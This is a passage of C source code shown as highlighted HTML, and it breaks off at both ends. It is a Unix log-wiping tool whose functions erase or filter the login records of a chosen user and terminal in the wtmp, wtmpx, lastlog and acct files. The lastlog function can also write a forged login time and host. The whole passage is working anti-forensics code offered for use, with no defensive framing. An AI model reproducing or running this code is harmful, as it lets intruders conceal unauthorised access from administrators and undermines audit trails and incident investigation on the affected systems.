</span></span></span><span class=line><span class=cl><span class=cm>	 * Determine offset of last relevent entry.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=nf>lseek</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span> <span class=o>-</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>ut</span><span class=p>)),</span> <span class=n>SEEK_END</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span> <span class=p>(</span><span class=nf>read</span> <span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ut</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ut</span><span class=p>)))</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>ut</span><span class=p>.</span><span class=n>ut_name</span><span class=p>,</span> <span class=n>who</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>who</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>line</span> <span class=o>||</span> <span class=p>(</span><span class=n>line</span> <span class=o>&amp;&amp;</span> 
</span></span><span class=line><span class=cl>			  <span class=o>!</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>ut</span><span class=p>.</span><span class=n>ut_line</span><span class=p>,</span> <span class=n>line</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>line</span><span class=p>))))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			  	<span class=nf>bzero</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>ut</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ut</span><span class=p>));</span>
</span></span><span class=line><span class=cl>				<span class=nf>lseek</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span> <span class=o>-</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>ut</span><span class=p>)),</span> <span class=n>SEEK_CUR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			  	<span class=nf>write</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ut</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ut</span><span class=p>));</span>
</span></span><span class=line><span class=cl>			  	<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=nf>lseek</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span> <span class=o>-</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>ut</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span><span class=p>),</span> <span class=n>SEEK_CUR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>close</span><span class=p>(</span><span class=n>fd1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Done.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * WTMPX editing if supported.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef HAVE_UTMPX
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>wipe_wtmpx</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>who</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> 		<span class=n>fd1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>utmpx</span>	<span class=n>utx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Patching %s .... &#34;</span><span class=p>,</span> <span class=n>WTMPX_FILE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	 * Open the utmp file and temporary file.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>fd1</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>WTMPX_FILE</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Opening %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>WTMPX_FILE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	 * Determine offset of last relevent entry.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=nf>lseek</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span> <span class=o>-</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>utx</span><span class=p>)),</span> <span class=n>SEEK_END</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span> <span class=p>(</span><span class=nf>read</span> <span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>utx</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>utx</span><span class=p>)))</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>utx</span><span class=p>.</span><span class=n>ut_name</span><span class=p>,</span> <span class=n>who</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>who</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>line</span> <span class=o>||</span> <span class=p>(</span><span class=n>line</span> <span class=o>&amp;&amp;</span> 
</span></span><span class=line><span class=cl>			  <span class=o>!</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>utx</span><span class=p>.</span><span class=n>ut_line</span><span class=p>,</span> <span class=n>line</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>line</span><span class=p>))))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			  	<span class=nf>bzero</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>utx</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>utx</span><span class=p>));</span>
</span></span><span class=line><span class=cl>				<span class=nf>lseek</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span> <span class=o>-</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>utx</span><span class=p>)),</span> <span class=n>SEEK_CUR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			  	<span class=nf>write</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>utx</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>utx</span><span class=p>));</span>
</span></span><span class=line><span class=cl>			  	<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=nf>lseek</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span> <span class=o>-</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>utx</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span><span class=p>),</span> <span class=n>SEEK_CUR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>close</span><span class=p>(</span><span class=n>fd1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Done.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * LASTLOG editing.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>wipe_lastlog</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>who</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>line</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>timestr</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>host</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span>		<span class=n>fd1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>lastlog</span>	<span class=n>ll</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>passwd</span>	<span class=o>*</span><span class=n>pwd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>tm</span>	<span class=o>*</span><span class=n>tm</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>	<span class=kt>char</span>		<span class=n>str</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Patching %s .... &#34;</span><span class=p>,</span> <span class=n>LASTLOG_FILE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>tm</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>tm</span> <span class=o>*</span><span class=p>)</span> <span class=nf>malloc</span><span class=p>(</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>tm</span><span class=p>)</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>        <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	 * Open the lastlog file.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>fd1</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>LASTLOG_FILE</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Opening %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>LASTLOG_FILE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>pwd</span> <span class=o>=</span> <span class=nf>getpwnam</span><span class=p>(</span><span class=n>who</span><span class=p>))</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Can&#39;t find user in passwd.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=nf>lseek</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span> <span class=n>pwd</span><span class=o>-&gt;</span><span class=n>pw_uid</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>lastlog</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>bzero</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>ll</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ll</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>line</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>		<span class=nf>strncpy</span><span class=p>(</span><span class=n>ll</span><span class=p>.</span><span class=n>ll_line</span><span class=p>,</span> <span class=n>line</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>line</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>timestr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=cm>/* YYMMddhhmm */</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nf>strlen</span><span class=p>(</span><span class=n>timestr</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>10</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Time format is YYMMddhhmm.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>		<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>		 * Extract Times.
</span></span></span><span class=line><span class=cl><span class=cm>		 */</span>
</span></span><span class=line><span class=cl>		<span class=n>str</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>str</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>timestr</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=n>str</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>timestr</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=n>tm</span><span class=o>-&gt;</span><span class=n>tm_year</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>str</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>		<span class=n>str</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>timestr</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=n>str</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>timestr</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=n>tm</span><span class=o>-&gt;</span><span class=n>tm_mon</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>str</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>		<span class=n>str</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>timestr</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=n>str</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>timestr</span><span class=p>[</span><span class=mi>5</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=n>tm</span><span class=o>-&gt;</span><span class=n>tm_mday</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>str</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>		<span class=n>str</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>timestr</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=n>str</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>timestr</span><span class=p>[</span><span class=mi>7</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=n>tm</span><span class=o>-&gt;</span><span class=n>tm_hour</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>str</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>		<span class=n>str</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>timestr</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=n>str</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>timestr</span><span class=p>[</span><span class=mi>9</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=n>tm</span><span class=o>-&gt;</span><span class=n>tm_min</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>str</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>tm</span><span class=o>-&gt;</span><span class=n>tm_sec</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>		<span class=n>ll</span><span class=p>.</span><span class=n>ll_time</span> <span class=o>=</span> <span class=nf>mktime</span><span class=p>(</span><span class=n>tm</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>host</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nf>strncpy</span><span class=p>(</span><span class=n>ll</span><span class=p>.</span><span class=n>ll_host</span><span class=p>,</span> <span class=n>host</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ll</span><span class=p>.</span><span class=n>ll_host</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>write</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>ll</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ll</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>close</span><span class=p>(</span><span class=n>fd1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Done.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#ifndef NO_ACCT
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * ACCOUNT editing.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>wipe_acct</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>who</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>    
</span></span><span class=line><span class=cl>	<span class=kt>int</span>		<span class=n>fd1</span><span class=p>,</span> <span class=n>fd2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>acct</span>	<span class=n>ac</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span>		<span class=n>ttyn</span><span class=p>[</span><span class=mi>50</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>passwd</span>   <span class=o>*</span><span class=n>pwd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>stat</span>	<span class=n>sbuf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span>		<span class=o>*</span><span class=n>tmpf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Patching %s .... &#34;</span><span class=p>,</span> <span class=n>ACCT_FILE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	 * Open the acct file and temporary file.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>fd1</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>ACCT_FILE</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Opening %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ACCT_FILE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	 * Grab a unique temporary filename.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=n>tmpf</span> <span class=o>=</span> <span class=nf>tmpnam</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>fd2</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>tmpf</span><span class=p>,</span> <span class=n>O_WRONLY</span> <span class=o>|</span> <span class=n>O_CREAT</span> <span class=o>|</span> <span class=n>O_TRUNC</span><span class=p>,</span> <span class=mi>600</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Opening tmp ACCT file</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>pwd</span> <span class=o>=</span> <span class=nf>getpwnam</span><span class=p>(</span><span class=n>who</span><span class=p>))</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Can&#39;t find user in passwd.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	 * Determine tty&#39;s device number
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=nf>strcpy</span><span class=p>(</span><span class=n>ttyn</span><span class=p>,</span> <span class=s>&#34;/dev/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>strcat</span><span class=p>(</span><span class=n>ttyn</span><span class=p>,</span> <span class=n>line</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nf>stat</span><span class=p>(</span><span class=n>ttyn</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>sbuf</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Determining tty device number.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span> <span class=nf>read</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ac</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ac</span><span class=p>))</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>ac</span><span class=p>.</span><span class=n>ac_uid</span> <span class=o>==</span> <span class=n>pwd</span><span class=o>-&gt;</span><span class=n>pw_uid</span> <span class=o>&amp;&amp;</span> <span class=n>ac</span><span class=p>.</span><span class=n>ac_tty</span> <span class=o>==</span> <span class=n>sbuf</span><span class=p>.</span><span class=n>st_rdev</span><span class=p>)</span> <span class=p>)</span>	
</span></span><span class=line><span class=cl>			<span class=nf>write</span><span class=p>(</span><span class=n>fd2</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ac</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ac</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>close</span><span class=p>(</span><span class=n>fd1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>close</span><span class=p>(</span><span class=n>fd2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=nf>copy_file</span><span class=p>(</span><span class=n>tmpf</span><span class=p>,</span> <span class=n>ACCT_FILE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span> <span class=nf>unlink</span><span class=p>(</span><span class=n>tmpf</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Unlinking tmp WTMP file.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Done.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
